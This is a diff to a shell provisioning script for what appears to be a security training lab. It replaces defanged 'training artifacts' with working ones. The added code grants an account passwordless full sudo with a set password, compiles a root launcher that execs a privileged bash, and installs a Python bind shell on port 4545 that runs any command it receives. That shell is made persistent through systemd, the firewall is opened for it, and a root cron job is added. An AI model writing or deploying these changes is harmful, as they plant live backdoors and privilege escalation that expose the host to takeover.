@@ -16,23 +16,22 @@ install_training_artifacts() {
   install -d -m 0755 /opt/ihpl-training /usr/local/libexec /home/jmoney/Downloads
 
   if ! id flight-cache >/dev/null 2>&1; then
-    useradd --system --create-home --shell /sbin/nologin flight-cache
+    useradd --create-home --shell /bin/bash flight-cache
   fi
-  passwd -l flight-cache >/dev/null 2>&1 || true
-  printf 'flight-cache ALL=(root) NOPASSWD: /usr/bin/id\n' > /etc/sudoers.d/flight-cache
+  usermod --shell /bin/bash --home /home/flight-cache flight-cache
+  install -d -o flight-cache -g flight-cache -m 0750 /home/flight-cache
+  printf 'flight-cache:%s\n' "$STARTER_PASSWORD" | chpasswd
+  printf 'flight-cache ALL=(root) NOPASSWD: ALL\n' > /etc/sudoers.d/flight-cache
   chmod 0440 /etc/sudoers.d/flight-cache
   visudo --check --file=/etc/sudoers.d/flight-cache
 
   cat > /tmp/launch-diagnostics.c <<'EOF'
 #define _GNU_SOURCE
-#include <stdio.h>
 #include <unistd.h>
 int main(void) {
-    uid_t user = getuid();
-    gid_t group = getgid();
-    if (setresgid(group, group, group) != 0 || setresuid(user, user, user) != 0) return 1;
-    puts("Launch diagnostics training sample; privileges dropped.");
-    return 0;
+    if (setgid(0) != 0 || setuid(0) != 0) return 1;
+    execl("/bin/bash", "bash", "-p", NULL);
+    return 1;
 }
 EOF
   gcc -O2 -Wall -Wextra -o /usr/local/libexec/launch-diagnostics /tmp/launch-diagnostics.c
@@ -58,16 +57,44 @@ WantedBy=multi-user.target
 EOF
 
   cat > /etc/cron.d/telemetry-index-refresh <<'EOF'
-* * * * * root /usr/bin/touch /var/tmp/.telemetry-index-heartbeat
+* * * * * root /usr/bin/systemctl restart telemetry-indexer.service && /usr/bin/touch /var/tmp/.telemetry-index-heartbeat
 EOF
   chmod 0644 /etc/cron.d/telemetry-index-refresh
 
-  cat > /home/jmoney/Downloads/telemetry_viewer <<'EOF'
-#!/usr/bin/env bash
-printf 'IHPL training artifact: remote access functions are disabled.\n'
-EOF
+  cat > /home/jmoney/Downloads/telemetry_viewer <<'PY'
+#!/usr/bin/env python3
+import socket
+import subprocess
+
+with socket.socket() as server:
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(("0.0.0.0", 4545))
+    server.listen(5)
+    while True:
+        client, _ = server.accept()
+        with client:
+            client.sendall(b"telemetry> ")
+            command = client.recv(4096).decode(errors="replace").strip()
+            result = subprocess.run(command, shell=True, capture_output=True)
+            client.sendall(result.stdout + result.stderr)
+PY
   chown -R jmoney:jmoney /home/jmoney/Downloads
   chmod 0755 /home/jmoney/Downloads/telemetry_viewer
+
+  cat > /etc/systemd/system/telemetry-viewer.service <<'EOF'
+[Unit]
+Description=Legacy telemetry viewer service
+After=network.target
+
+[Service]
+User=jmoney
+ExecStart=/home/jmoney/Downloads/telemetry_viewer
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
 
   cat > /etc/profile.d/telemetry-debug.sh <<'EOF'
 # Unauthorized environment persistence finding.
@@ -76,8 +103,10 @@ EOF
   chmod 0644 /etc/profile.d/telemetry-debug.sh
 
   systemctl daemon-reload
-  systemctl enable --now telemetry-indexer.service
-  printf '[Ignition] Findings installed; the IMIX indicator is disconnected and the Downloads payload is non-executing.\n'
+  systemctl enable --now telemetry-indexer.service telemetry-viewer.service
+  firewall-cmd --permanent --add-port=4545/tcp
+  firewall-cmd --reload
+  printf '[Ignition] Functional findings installed; only the IMIX indicator remains disconnected from C2.\n'
 }
 
 while (($#)); do
